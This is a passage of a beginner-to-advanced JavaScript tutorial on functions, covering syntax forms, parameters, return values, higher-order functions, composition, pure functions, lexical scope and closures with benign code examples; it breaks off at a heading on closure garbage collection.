# Module 04 — Complete JavaScript Functions
## Beginner → Advanced → Senior

> **Core Invariant**: In JavaScript, functions are **first-class objects** (specifically callable objects implementing the internal `[[Call]]` and optionally `[[Construct]]` method slots). This means functions can be stored in variables, passed as arguments, returned from other functions, have properties attached dynamically, and carry a reference to their enclosing Lexical Environment—forming **closures**.

---

## 00. How to Use This Module & Roadmap

Welcome to the definitive JavaScript Functions and Execution Model Masterclass. Functions are the absolute heart and engine of JavaScript. Whether you write object-oriented classes, functional data pipelines, or event-driven asynchronous microservices, everything in JavaScript reduces to function execution.

### Learning Roadmap
```text
Beginner
   ↓
Level 01: What is a Function? (Genesis, Definition vs Invocation, Return Values, Side Effects)
   ↓
Level 02-04: Syntaxes (Declarations, Expressions, Named Expressions, Arrow Functions & Object Pitfalls)
   ↓
Level 05: The Complete 22 Function Types Encyclopedia & Architectural Comparison
   ↓
Level 06-09: Parameters & Arguments (Defaults, Rest, The 'arguments' Object, Destructuring)
   ↓
Level 10-11: Return Mechanics & First-Class Citizens (Functions as Values, Arrays, Dictionaries)
   ↓
Level 12-16: Callbacks, Higher-Order Functions, Composition, Pure Functions & Side-Effect Boundaries
   ↓
Level 17-21: Scope Architecture, Lexical Scope, Closures, Loop Var vs Let Pitfalls & IIFE
   ↓
Level 22-25: The 'this' Keyword (The 4 Rules, Lexical Arrow 'this', call/apply/bind, Method Detachment)
   ↓
Level 26-31: Function Objects, Properties, Constructors, Prototypes & Modern Class Methods
   ↓
Level 32-40: Recursion, Memoization, Currying, Partial Application, Wrappers & Factories
   ↓
Level 41-48: Asynchronous Functions (async/await, Async Arrows, Map Pitfalls, Generators & Iterators)
   ↓
Level 49-62: The Execution Model (Call Stack, Hoisting, Closure Lifetimes, Pass-by-Value References, Middleware)
   ↓
Level 63-77: Functional Programming, Senior Design, DI, Performance, V8 Internals, Security & Decision Trees
   ↓
Level 78-88: 40 Function Algorithms, 7 Custom Array Methods, Debounce, Throttle, Once, Event Emitter
   ↓
Level 89-100: 5 Production Projects, Debugging, Testing, 30+ Interview Q&As, Senior Architecture & Checklists
   ↓
Senior Production Engineer
```

### Visual Legend Used Throughout This Guide
* 📘 **Concept**: Core theory, mental models, and ECMAScript specification rules.
* 💡 **Important**: Invariants and architectural rules to commit to memory.
* ⚠️ **Common Mistake**: Production bugs, junior traps, and silent failures.
* 🧠 **Deep Dive**: Engine mechanics (V8 TurboFan, Call Frames, Scope Chains).
* 🔧 **Real World**: Production patterns used in enterprise backends and React frontends.
* 🧪 **Practice**: Hands-on exercises tiered from Beginner to Senior.
* 🎯 **Challenge**: Multi-step algorithmic coding problems.
* 💼 **Interview**: Senior interview questions with model answers.
* ⚡ **Performance**: Algorithmic complexity, inline caching, and heap allocations.
* 🔐 **Security**: Defensive coding, injection prevention, and prototype pollution defenses.

---

## 01. What is a Function?

### 1. The Fundamental Problem Functions Solve
Without functions, code is a single sequential script. If you need to calculate tax on an item in 10 different places across your application, you would have to copy and paste the identical math 10 times.
If the tax rate changes, you must find and update all 10 places—inevitably missing one and causing a financial discrepancy.

A **function** is a packaged, reusable block of code designed to perform a specific task. You define it once, give it a meaningful name, and run it whenever and wherever needed.

### 2. The Mental Model: Definition vs Invocation
A function has two distinct phases in time:
1. **Function Definition (Creation)**: Writing the blueprint. No execution happens here. The JavaScript engine allocates a function object in memory and stores the instructions.
2. **Function Invocation (Call / Execution)**: Triggering the blueprint by using parentheses `()`. The engine allocates an execution context, binds input parameters to supplied arguments, executes the body line by line, and returns an output.

```text
Function Definition:
┌────────────────────────────────────────────────────────┐
│  function greet(name) {                                │
│      return "Hello, " + name + "!";                    │
│  }                                                     │
└────────────────────────────────────────────────────────┘
                           │
       [ Wait until called with () ]
                           │
                           ▼
Function Invocation: greet("Ayush")
┌────────────────────────────────────────────────────────┐
│ 1. Engine creates Function Execution Context           │
│ 2. Parameter 'name' receives argument value "Ayush"    │
│ 3. Executes body: "Hello, " + "Ayush" + "!"            │
│ 4. 'return' outputs: "Hello, Ayush!"                   │
│ 5. Execution Context is popped off Call Stack          │
└────────────────────────────────────────────────────────┘
```

### 3. Inputs, Processing, Output & Side Effects
A function interacts with the outside world through three channels:
1. **Inputs (Parameters / Arguments)**: Data passed into the function.
2. **Processing**: Computations, loops, transformations performed on the data.
3. **Output (Return Value)**: The result sent back to the caller.
4. **Side Effects**: Any observable change to state outside the function (writing to a database, updating a global variable, logging to the console, mutating an argument).

```javascript
// A pure calculation (inputs -> processing -> output)
function calculateTotal(price, taxRate) {
  const tax = price * taxRate;
  return price + tax;
}

const invoiceTotal = calculateTotal(100, 0.08); // invoiceTotal is 108
console.log(invoiceTotal);
```

---

## 02. Function Declarations

A **Function Declaration** (also known as a function statement) is the classical way to define a function in JavaScript.

### 1. Syntax
```javascript
function functionName(parameter1, parameter2) {
  // Function body (instructions)
  return result; // Optional return statement
}
```

### 2. Basic Example
```javascript
function calculateDiscount(price, discountPercent) {
  const discountAmount = price * (discountPercent / 100);
  return price - discountAmount;
}

// Invoking multiple times with distinct arguments
const winterSale = calculateDiscount(100, 20); // 80
const flashSale = calculateDiscount(250, 50);  // 125
console.log(winterSale, flashSale);
```

### 3. Function Declaration Hoisting
Function declarations are **hoisted** to the top of their enclosing lexical scope during the engine's compilation/creation phase. This means you can call a function declaration **before** the line where it is written:

```javascript
// ✅ Works perfectly! Output: "System online"
bootSystem();

function bootSystem() {
  console.log("System online");
}
```

#### 🧠 Why does this work?
During the engine's creation phase, before a single line of code executes, the JavaScript engine registers all function declarations in the current Lexical Environment and binds their names directly to the initialized function object in memory.

---

## 03. Function Expressions

A **Function Expression** defines a function as part of a larger expression—typically by assigning it to a variable or constant.

### 1. Anonymous Function Expression
```javascript
const formatCurrency = function(amount) {
  return "$" + amount.toFixed(2);
};

console.log(formatCurrency(49.9)); // "$49.90"
```

### 2. Named Function Expression (NFE)
A function expression can have a name of its own:
```javascript
const calculateFactorial = function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1); // factorial is accessible INSIDE its own body!
};

console.log(calculateFactorial(5)); // 120
// console.log(factorial(5)); // ❌ ReferenceError: factorial is not defined outside!
```

> 💡 **Why Named Function Expressions Matter**:
> 1. **Stack Traces**: In production logs and APM monitors (Datadog, Sentry), an anonymous function appears as `(anonymous)`, making debugging painful. An NFE explicitly displays its name in call stacks.
> 2. **Clean Recursion**: The function can reliably refer to itself without relying on outer variable names.

### 3. Hoisting Difference: Declarations vs Expressions
Function expressions follow the hoisting rules of the variable they are assigned to:
```javascript
// ❌ TypeError: sayHello is not a function (when using var)
// ❌ ReferenceError: Cannot access 'sayHello' before initialization (when using const/let)
sayHello();

const sayHello = function() {
  console.log("Hello!");
};
```
With `const` and `let`, the variable is placed in the **Temporal Dead Zone (TDZ)** from the start of the block until the declaration line is reached.

---

## 04. Arrow Functions

Introduced in ES6 (2015), **Arrow Functions** provide a concise syntax for writing function expressions and introduce unique lexical behavior.

### 1. Syntax Variations
```javascript
// 1. Zero parameters (parentheses required)
const ping = () => "pong";

// 2. Single parameter (parentheses optional)
const double = x => x * 2;

// 3. Multiple parameters (parentheses required)
const add = (a, b) => a + b;

// 4. Block body (explicit 'return' required!)
const compute = (x, y) => {
  const sum = x + y;
  return sum * 2;
};
```

### 2. Concise Body (Implicit Return) vs Block Body
If you omit the curly braces `{}`, the expression following the arrow `=>` is evaluated and **implicitly returned**:
```javascript
const square = x => x * x; // returns x * x automatically
```
If you use curly braces `{}`, you have created a block body and **MUST** explicitly use the `return` keyword; otherwise, the function returns `undefined`:
```javascript
const brokenSquare = x => { x * x; };
console.log(brokenSquare(4)); // undefined! (Forgot 'return')
```

### 3. The Object Literal Return Pitfall
In JavaScript grammar, curly braces `{}` are ambiguous: they can represent an **object literal** or a **block statement**.
In arrow functions, the engine always parses curly braces following `=>` as a **block statement**:

```javascript
// ❌ BROKEN: Engine thinks {} is a block statement, not an object!
const createUserBroken = (name, role) => { name: name, role: role };
console.log(createUserBroken("Ayush", "Architect")); // undefined!

// ✅ SOLUTION: Wrap the object literal in parentheses ()!
const createUser = (name, role) => ({ name: name, role: role });
console.log(createUser("Ayush", "Architect")); 
// { name: 'Ayush', role: 'Architect' }
```

---

## 05. All 22 Major Function Types

JavaScript supports 22 distinct function forms. Here is the comprehensive reference:

### 1. Function Declaration
* **Syntax**: `function name(params) {}`
* **When Used**: Top-level module logic, standard reusable utilities.
* **Important Behavior**: Fully hoisted with definition.
* **Common Mistake**: Placing declarations inside loose conditional blocks (`if (cond) function foo() {}`) where cross-browser hoisting quirks can occur.

### 2. Function Expression (Anonymous)
* **Syntax**: `const f = function(params) {};`
* **When Used**: Passing functions into variables or configuration tables.
* **Important Behavior**: Variable is hoisted (or in TDZ), but function definition is not.
* **Common Mistake**: Calling before assignment line.

### 3. Named Function Expression (NFE)
* **Syntax**: `const f = function helper(params) {};`
* **When Used**: Recursive expressions and production error logging.
* **Important Behavior**: `helper` is bound strictly within the function's own body.
* **Common Mistake**: Trying to invoke `helper()` from the outer parent scope.

### 4. Anonymous Function
* **Syntax**: `function(params) {}`
* **When Used**: One-off inline callbacks (e.g. `setTimeout(function() {}, 100)`).
* **Important Behavior**: Cannot be referenced again after declaration.
* **Common Mistake**: Hard to identify in production error stack traces.

### 5. Arrow Function
* **Syntax**: `const f = (params) => expression;`
* **When Used**: Callbacks, functional pipelines, inline array transformations.
* **Important Behavior**: Lexically binds `this`, has no `arguments` object, cannot be used as constructor (`new`).
* **Common Mistake**: Using as an object method when receiver `this` is needed.

### 6. Method Shorthand
* **Syntax**: `const obj = { run() {} };`
* **When Used**: Object literals and class bodies.
* **Important Behavior**: Has access to `super` keyword; concise syntax.
* **Common Mistake**: Forgetting it is non-constructible (`new obj.run()` throws `TypeError`).

### 7. Constructor Function
* **Syntax**: `function User(name) { this.name = name; }`
* **When Used**: Pre-ES6 object-oriented class patterns.
* **Important Behavior**: Invoked with `new`; binds `this` to newly created object.
* **Common Mistake**: Forgetting `new`, polluting the global object in non-strict mode.

### 8. Immediately Invoked Function Expression (IIFE)
* **Syntax**: `(function() { /* private scope */ })();`
* **When Used**: Historical encapsulation, isolating variables, executing async setup blocks.
* **Important Behavior**: Executes immediately upon evaluation; discarded after run.
* **Common Mistake**: Missing semicolon on the preceding line causing syntax errors.

### 9. Callback Function
* **Syntax**: `fetchData(url, (err, data) => {});`
* **When Used**: Event handling, asynchronous operations, array iterators.
* **Important Behavior**: Inverted control: called by the receiver function.
* **Common Mistake**: Calling the function immediately instead of passing its reference (`fn()` vs `fn`).

### 10. Higher-Order Function (HOF)
* **Syntax**: `function withLogging(fn) { return (...args) => fn(...args); }`
* **When Used**: Middleware, decorators, array transformations (`map`, `filter`).
* **Important Behavior**: Accepts a function as an argument OR returns a function.
* **Common Mistake**: Breaking `this` binding when forwarding arguments.

### 11. Recursive Function
* **Syntax**: `function countdown(n) { if (n <= 0) return; countdown(n - 1); }`
* **When Used**: Tree traversal, nested object walking, divide-and-conquer algorithms.
* **Important Behavior**: Must contain a reachable **base case**.
* **Common Mistake**: Missing base case resulting in Call Stack Overflow.

### 12. Async Function
* **Syntax**: `async function load() { const res = await fetch(); return res; }`
* **When Used**: Network requests, database I/O, file reading.
* **Important Behavior**: Always returns a `Promise`, even if you return a primitive value.
* **Common Mistake**: Forgetting that return value must be awaited or handled via `.then()`.

### 13. Async Arrow Function
* **Syntax**: `const load = async () => await fetch();`
* **When Used**: Modern promise-based callbacks, React event handlers.
* **Important Behavior**: Combines lexical `this` with promise return semantics.
* **Common Mistake**: Using in `Array.prototype.forEach` expecting the loop to wait.

### 14. Generator Function
* **Syntax**: `function* stream() { yield 1; yield 2; }`
* **When Used**: Custom iterables, lazy sequence generation, state machines.
* **Important Behavior**: Pausable execution via `yield`; returns a Generator object.
* **Common Mistake**: Calling `stream()` and expecting body to execute immediately.

### 15. Generator Method
* **Syntax**: `const obj = { *items() { yield "a"; } };`
* **When Used**: Custom iterator implementations on classes or objects (`[Symbol.iterator]`).
* **Important Behavior**: Concise syntax for generator inside object/class.
* **Common Mistake**: Omitting the asterisk `*`.

### 16. Async Generator Function
* **Syntax**: `async function* streamPages() { yield await fetch(); }`
* **When Used**: Paginated API consumption, streaming file chunks over WebSockets.
* **Important Behavior**: Combines async promises with lazy generator iteration (`for await...of`).
* **Common Mistake**: Attempting to consume with a synchronous `for...of` loop.

### 17. Getter Function
* **Syntax**: `get fullName() { return this.first + " " + this.last; }`
* **When Used**: Computed properties on objects and classes.
* **Important Behavior**: Invoked transparently on property access without `()`.
* **Common Mistake**: Executing expensive or side-effectful logic inside a getter.

### 18. Setter Function
* **Syntax**: `set age(val) { if (val < 0) throw new Error(); this._age = val; }`
* **When Used**: Encapsulated property mutation and schema validation.
* **Important Behavior**: Accepts exactly one parameter; returns assigned value.
* **Common Mistake**: Creating infinite loops by assigning to the same property name.

### 19. Class Instance Method
* **Syntax**: `class Bot { speak() { console.log(this.name); } }`
* **When Used**: Object-oriented domain models.
* **Important Behavior**: Attached to `Bot.prototype`, shared across all instances.
* **Common Mistake**: Detaching method from instance and losing `this`.

### 20. Class Static Method
* **Syntax**: `class MathUtil { static add(a, b) { return a + b; } }`
* **When Used**: Factory functions, pure utility functions tied to a namespace.
* **Important Behavior**: Attached directly to constructor constructor (`MathUtil.add`), not instances.
* **Common Mistake**: Attempting to call from an instance (`new MathUtil().add()`).

### 21. Function Returned From Another Function (Curried / Factory)
* **Syntax**: `const multiplier = factor => number => number * factor;`
* **When Used**: Configuration factories, functional currying, partial application.
* **Important Behavior**: Retains access to outer parameters via closure.
* **Common Mistake**: Invoking with single argument when two calls are needed (`multiplier(2)(5)`).

### 22. Function Passed as an Argument (First-Class Value)
* **Syntax**: `users.filter(isValidUser);`
* **When Used**: Point-free programming, clean functional composition.
* **Important Behavior**: The function reference is passed directly.
* **Common Mistake**: Passing function invocation `users.filter(isValidUser())` by mistake.

---

### Function Type Master Comparison Table

| Function Type | Syntax Example | Hoisted? | Own `this`? | Own `arguments`? | Usable with `new`? | Has `.prototype`? | Returns Promise? |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Declaration** | `function f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ (unless async) |
| **Expression** | `const f = function() {}` | ❌ TDZ/Var | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ (unless async) |
| **Arrow** | `const f = () => {}` | ❌ TDZ | ❌ Lexical | ❌ No | ❌ No | ❌ No | ❌ (unless async) |
| **Method Shorthand** | `{ f() {} }` | ❌ No | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ❌ (unless async) |
| **Constructor** | `function User() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No |
| **Class Method** | `class C { f() {} }` | ❌ No | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ❌ (unless async) |
| **Async Function** | `async function f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ❌ No | ✅ Always |
| **Generator** | `function* f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ✅ Yes | ❌ No (Yields) |
| **Async Generator**| `async function* f() {}` | ✅ Full | ✅ Dynamic | ✅ Yes | ❌ No | ✅ Yes | ✅ Async Iterable |
| **IIFE** | `(function() {})()` | ❌ Immediate| ✅ Dynamic | ✅ Yes | ❌ N/A | ❌ N/A | ❌ (unless async) |


---

## 06. Parameters & Arguments

Understanding the precise difference between **parameters** and **arguments** is essential for mastering function signatures.

### 1. Parameter vs Argument
* **Parameter**: A named variable listed in the **function definition**. It acts as an empty slot waiting to be filled.
* **Argument**: The **actual concrete value** passed into the function when it is **invoked**.

```javascript
// 'name' and 'role' are PARAMETERS (definition time)
function registerUser(name, role) {
  return `User ${name} registered as ${role}.`;
}

// "Ayush" and "Lead Architect" are ARGUMENTS (call time)
registerUser("Ayush", "Lead Architect");
```

### 2. Missing Arguments (Under-Application)
In JavaScript, functions do not throw errors if you pass fewer arguments than declared parameters. Any parameter that does not receive an argument is automatically initialized to `undefined`:

```javascript
function calculateMetrics(a, b, c) {
  console.log({ a, b, c });
}

calculateMetrics(10); // { a: 10, b: undefined, c: undefined }
```

### 3. Extra Arguments (Over-Application)
If you pass more arguments than parameters declared, JavaScript does not throw an error. The extra arguments are simply ignored by the named parameters (though they can still be captured via Rest Parameters or the `arguments` object):

```javascript
function getFirstTwo(a, b) {
  return [a, b];
}

console.log(getFirstTwo(1, 2, 3, 4, 5)); // [1, 2]
```

---

## 07. Default Parameters

ES6 introduced default parameter values, allowing functions to specify fallback values if arguments are missing or explicitly passed as `undefined`.

### 1. Syntax & Mechanics
```javascript
function sendNotification(message, channel = "email", retries = 3) {
  return `Sending "${message}" via ${channel} with ${retries} retries.`;
}

console.log(sendNotification("Server restart")); 
// 'Sending "Server restart" via email with 3 retries.'
```

### 2. The `undefined` vs `null` Rule
> 💡 **CRITICAL RULE**: Default parameters are triggered **ONLY when the argument is `undefined` or completely omitted**. Passing `null`, `false`, `0`, or `""` will **NOT** trigger the default parameter!

```javascript
function setPort(port = 8080) {
  return port;
}

console.log(setPort(undefined)); // 8080 (Default triggered!)
console.log(setPort());          // 8080 (Default triggered!)

console.log(setPort(null));      // null (NOT triggered! null is an explicit value)
console.log(setPort(0));         // 0    (NOT triggered! 0 is a valid number)
console.log(setPort(false));     // false (NOT triggered!)
```

### 3. Defaults are Evaluated at Call Time (Not Creation Time)
Unlike Python (where default arguments are evaluated once at definition time, creating mutable list traps), JavaScript default parameters are evaluated **dynamically each time the function is called**:

```javascript
function generateId(id = Date.now()) {
  return id;
}

// Every invocation generates a fresh timestamp:
const id1 = generateId();
const id2 = generateId();
```

---

## 08. Rest Parameters (`...rest`)

Rest parameters allow a function to accept an indefinite number of arguments as a **genuine JavaScript Array**.

### 1. Syntax & Rules
```javascript
function calculateSum(...numbers) {
  // 'numbers' is a true JavaScript Array!
  return numbers.reduce((acc, curr) => acc + curr, 0);
}

console.log(calculateSum(10, 20, 30, 40)); // 100
console.log(calculateSum()); // 0
```

### 2. Invariant: Rest Must Be the Final Parameter
A function can have at most **one** rest parameter, and it **must be the very last parameter** in the parameter list:

```javascript
// ✅ Valid: First parameter is captured, remaining into rest
function logEvent(eventType, ...payloads) {
  console.log(`[${eventType}]`, payloads);
}

// ❌ SyntaxError: Rest parameter must be last formal parameter
// function invalid(...items, lastItem) {}
```

---

## 09. The `arguments` Object

In non-arrow functions, JavaScript automatically provides a local variable named `arguments` inside the function body.

### 1. What is the `arguments` Object?
`arguments` is an **Array-Like Object** containing all the arguments passed to the function:
* It has a `.length` property.
* It supports zero-based bracket indexing (`arguments[0]`, `arguments[1]`).
* ❌ It is **NOT** a true Array: it lacks `map`, `filter`, `reduce`, `slice`, and `forEach`.

```javascript
function legacySum() {
  console.log(Array.isArray(arguments)); // false!
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}

console.log(legacySum(1, 2, 3, 4)); // 10
```

### 2. Converting `arguments` to a True Array
```javascript
function processLegacyArgs() {
  // 1. Array.from() (Modern ES6)
  const args1 = Array.from(arguments);

  // 2. Spread operator
  const args2 = [...arguments];

  // 3. Legacy slice
  const args3 = Array.prototype.slice.call(arguments);
}
```

### 3. Rest Parameters vs `arguments` Master Comparison

| Feature | Rest Parameters (`...args`) | The `arguments` Object |
| :--- | :--- | :--- |
| **Data Type** | Real `Array` instance | Exotic Array-like `Object` |
| **Array Methods** | Directly supports `map`, `filter`, `reduce` | None (throws `TypeError`) |
| **Arrow Functions** | ✅ Fully supported | ❌ Unavailable (ReferenceError or outer scope) |
| **Selective Capture**| Can capture only the tail (`first, ...rest`) | Always captures all arguments |
| **Engine Optimization**| TurboFan compiler friendly | Can trigger de-optimization if passed around |
| **Recommendation** | **Always use in modern code** | Avoid in modern JavaScript |

---

## 10. Return Values & Early Returns

Every function in JavaScript returns a value.

### 1. Default Return Value (`undefined`)
If a function does not have a `return` statement, or if it executes `return;` with no expression, it implicitly returns `undefined`:

```javascript
function logNotice(msg) {
  console.log("Notice:", msg);
  // No return statement
}

const res = logNotice("Deploy started");
console.log(res); // undefined
```

### 2. The Early Return / Guard Clause Pattern
A `return` statement stops execution of the function immediately. Senior engineers use **Guard Clauses** at the start of a function to handle edge cases and invalid inputs, eliminating deeply nested `if/else` structures:

```javascript
// ❌ BAD: Deeply nested pyramid of doom
function processPaymentBad(user, amount) {
  if (user) {
    if (user.isActive) {
      if (amount > 0) {
        if (user.balance >= amount) {
          user.balance -= amount;
          return { success: true };
        } else {
          return { error: "Insufficient funds" };
        }
      } else {
        return { error: "Invalid amount" };
      }
    } else {
      return { error: "User inactive" };
    }
  } else {
    return { error: "User missing" };
  }
}

// ✅ GOOD: Clean Guard Clauses with Early Returns
function processPayment(user, amount) {
  if (!user) return { error: "User missing" };
  if (!user.isActive) return { error: "User inactive" };
  if (amount <= 0) return { error: "Invalid amount" };
  if (user.balance < amount) return { error: "Insufficient funds" };

  user.balance -= amount;
  return { success: true };
}
```

---

## 11. Functions as First-Class Citizens

In computer science, a programming language has **first-class functions** if functions are treated like any other value (numbers, strings, booleans).

### What Can You Do With Functions in JavaScript?

#### 1. Store in Variables
```javascript
const computeTax = function(amount) { return amount * 0.15; };
```

#### 2. Pass as Arguments to Other Functions
```javascript
const numbers = [1, 2, 3, 4, 5];
const isEven = n => n % 2 === 0;

const evens = numbers.filter(isEven); // Passing 'isEven' function reference
console.log(evens); // [2, 4]
```

#### 3. Return Functions from Other Functions
```javascript
function createMultiplier(factor) {
  return function(num) {
    return num * factor;
  };
}

const triple = createMultiplier(3);
console.log(triple(10)); // 30
```

#### 4. Store in Arrays & Objects (Strategy Pattern)
```javascript
const arithmeticOps = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b
};

function executeOperation(opName, a, b) {
  const op = arithmeticOps[opName];
  if (!op) throw new Error("Unknown operation");
  return op(a, b);
}

console.log(executeOperation("multiply", 6, 7)); // 42
```

---

## 12. Callback Functions

A **callback function** is a function passed as an argument into another function, intended to be executed ("called back") at a later point in time.

```text
Caller Function ────────> Passes Callback Ref ────────> Receiver Function
                                                              │
                                                        Executes processing
                                                              │
Result / Event  <──────── Callback Invoked <──────────────────┘
```

### 1. Synchronous Callbacks
A synchronous callback executes immediately during the execution of the calling function:
```javascript
function transformList(items, transformer) {
  const output = [];
  for (const item of items) {
    output.push(transformer(item)); // Synchronous invocation
  }
  return output;
}

const doubled = transformList([1, 2, 3], x => x * 2);
console.log(doubled); // [2, 4, 6]
```

### 2. Asynchronous Callbacks
An asynchronous callback executes after an asynchronous operation has completed (I/O, timer, network request):
```javascript
console.log("1. Starting timer...");

setTimeout(() => {
  console.log("3. Timer fired!");
}, 1000);

console.log("2. Script continues immediately.");
```

---

## 13. Higher-Order Functions (HOFs)

A **Higher-Order Function** is any function that meets at least one of these two criteria:
1. It accepts one or more functions as arguments.
2. It returns a function as its result.

### 1. Built-in Higher-Order Functions
Array methods like `map`, `filter`, `reduce`, `some`, `every`, `find`, and `sort` are the most common higher-order functions in JavaScript:
```javascript
const prices = [100, 200, 300];
const discounted = prices.map(price => price * 0.9);
```

### 2. Building Custom Higher-Order Functions: Function Decorators
A higher-order function that takes a function, augments its behavior, and returns the enhanced function:
```javascript
function withExecutionTiming(fn) {
  return function(...args) {
    const start = performance.now();
    const result = fn.apply(this, args);
    const duration = performance.now() - start;
    console.log(`Function ${fn.name || "anonymous"} executed in ${duration.toFixed(3)}ms`);
    return result;
  };
}

const slowOperation = () => {
  let count = 0;
  for (let i = 0; i < 1e6; i++) count += i;
  return count;
};

const timedOperation = withExecutionTiming(slowOperation);
timedOperation(); // Logs execution time and returns count
```

---

## 14. Function Composition

Function composition is the process of combining two or more functions to produce a new function:
$$h(x) = f(g(x))$$

### 1. Manual Composition
```javascript
const trim = s => s.trim();
const toLowerCase = s => s.toLowerCase();
const slugify = s => s.replace(/\s+/g, "-");

// Composed manually (inside-out):
const createSlug = text => slugify(toLowerCase(trim(text)));
console.log(createSlug("   JavaScript Functions Guide   ")); // "javascript-functions-guide"
```

### 2. Building `pipe()` (Left-to-Right Composition)
In production code, inside-out reading ($f(g(h(x)))$) becomes unreadable. We build a `pipe` utility that executes functions left-to-right:

```javascript
const pipe = (...fns) => initialValue => 
  fns.reduce((value, fn) => fn(value), initialValue);

const formatUsername = pipe(
  trim,
  toLowerCase,
  s => "@" + s
);

console.log(formatUsername("   AyushKumar   ")); // "@ayushkumar"
```

---

## 15. Pure Functions

A **Pure Function** is a function that satisfies two strict mathematical properties:
1. **Deterministic (Identical Inputs $\rightarrow$ Identical Outputs)**: Given the same arguments, it will always return the exact same output.
2. **No Observable Side Effects**: It does not modify external state, mutate inputs, write to files, log to console, or trigger I/O.

```javascript
// ✅ PURE: No side effects, purely deterministic
function calculateSubtotal(items) {
  return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
}

// ❌ IMPURE (Relies on external mutable global variable):
let taxRate = 0.08;
function calculateTaxImpure(subtotal) {
  return subtotal * taxRate; // If taxRate changes, output changes for same subtotal!
}

// ❌ IMPURE (Mutates its input parameter):
function addItemImpure(cart, item) {
  cart.push(item); // Mutates caller's array!
  return cart;
}

// ✅ PURE EQUIVALENT (Immutable):
function addItemPure(cart, item) {
  return [...cart, item]; // Returns brand new array!
}
```

### Why Pure Functions Matter
1. **Zero State Collisions**: Thread-safe in concurrent / Web Worker environments.
2. **Effortless Unit Testing**: No mocks, stubs, or state resetting needed. Just pass input and assert output.
3. **Memoization Ready**: Pure functions can be cached indefinitely based on input arguments.

---

## 16. Side Effects & The Pure Core / Impure Shell Pattern

A **side effect** is any change in the state of the application or world outside the function's local execution context.

### Common Side Effects
* Mutating a variable defined outside the function.
* Mutating input object/array arguments.
* Printing to console (`console.log`).
* Writing to the DOM (`document.getElementById`).
* Network I/O (`fetch`, HTTP requests).
* Database and Filesystem writes.
* Reading or setting cookies / `localStorage`.
* Generating random numbers (`Math.random()`) or current timestamps (`Date.now()`).

### Architectural Strategy: The Pure Core / Impure Shell
Production systems cannot avoid side effects entirely—a web app that does not write to the DOM or make network requests does nothing useful!
The architectural goal is to **isolate side effects to the thin outer perimeter (the shell)**, keeping the core business logic **100% pure**:

```text
┌─────────────────────────────────────────────────────────────┐
│                   IMPURE SHELL (I/O, Frameworks)            │
│  - Reads database / fetch from network                      │
│  - Receives HTTP request payload                            │
│  - Dispatches to Pure Core                                  │
│                                                             │
│       ┌──────────────────────────────────────────────┐      │
│       │                 PURE CORE                    │      │
│       │  - Business logic calculation                │      │
│       │  - Pricing rules, validation, discounts      │      │
│       │  - 100% Deterministic & Pure Functions      │      │
│       └──────────────────────────────────────────────┘      │
│                                                             │
│  - Writes database update / sends HTTP response             │
└─────────────────────────────────────────────────────────────┘
```


---

## 17. Scope & The Scope Chain

**Scope** defines the accessibility and visibility of variables, objects, and functions in some particular part of your code during runtime.

### 1. The Three Tiers of Scope in Modern JavaScript
1. **Global Scope**: Variables declared outside of any function or curly bracket block `{}`. Accessible everywhere.
2. **Function Scope**: Variables declared inside a function (via `var`, `let`, or `const`). Accessible only within that function.
3. **Block Scope (ES6)**: Variables declared with `let` or `const` inside any curly braces `{}` (such as `if`, `for`, `while`, or standalone blocks). Accessible only within that block.

```javascript
const globalVar = "Global";

function outerScope() {
  const functionVar = "Function-Scoped";

  if (true) {
    const blockVar = "Block-Scoped";
    var hoistedFunctionVar = "Function-Scoped via Var";
  }

  // console.log(blockVar); // ❌ ReferenceError: blockVar is not defined!
  console.log(hoistedFunctionVar); // ✅ Accessible! (var ignores block scope!)
}
```

---

## 18. Lexical Scope (Static Scope)

JavaScript employs **Lexical Scoping** (also known as Static Scoping).

> 💡 **THE LEXICAL INVARIANT**:
> The scope of an identifier is determined by its **physical location in the source code at authoring time (where it was declared)**, NOT where or how the function is subsequently called at runtime.

```javascript
const user = "Global Ayush";

function logUser() {
  // Looks up 'user' based on where logUser was CREATED, not where it was invoked!
  console.log(user);
}

function runWithLocalContext() {
  const user = "Local Marcus";
  logUser(); // What does this print?
}

runWithLocalContext(); // Prints: "Global Ayush" (NOT "Local Marcus"!)
```

### The Scope Chain Traversal
When the JavaScript engine looks up a variable name, it checks:
1. Current Local Execution Context (Environment Record).
2. If not found, it traverses to the immediate enclosing Lexical Environment (Outer Reference).
3. Continues step-by-step up the chain until reaching the Global Scope.
4. If not found in Global Scope: throws `ReferenceError: [identifier] is not defined`.

```text
┌────────────────────────────────────────────────────────┐
│ Global Scope: [ globalVal = 1 ]                        │
│    ▲                                                   │
│    │ Outer Lexical Reference                           │
│ ┌────────────────────────────────────────────────────┐ │
│ │ outer() Scope: [ outerVal = 2 ]                    │ │
│ │    ▲                                               │ │
│ │    │ Outer Lexical Reference                       │ │
│ │ ┌────────────────────────────────────────────────┐ │ │
│ │ │ inner() Scope: [ innerVal = 3 ]                │ │ │
│ │ │ - Can read innerVal, outerVal, and globalVal   │ │ │
│ │ └────────────────────────────────────────────────┘ │ │
│ └────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────┘
```

---

## 19. Closures

A **closure** is the combination of a function bundled together with references to its surrounding state (its Lexical Environment).

In simple terms: **A closure gives an inner function access to an outer function's scope even after the outer function has finished executing and returned!**

### 1. Foundational Closure Example
```javascript
function createCounter() {
  let count = 0; // Private variable trapped inside the closure!

  return function increment() {
    count++;
    return count;
  };
}

const counter1 = createCounter();
console.log(counter1()); // 1
console.log(counter1()); // 2

const counter2 = createCounter(); // Completely independent closure environment!
console.log(counter2()); // 1
console.log(counter1()); // 3
```

#### 🧠 Why is `count` not garbage collected?
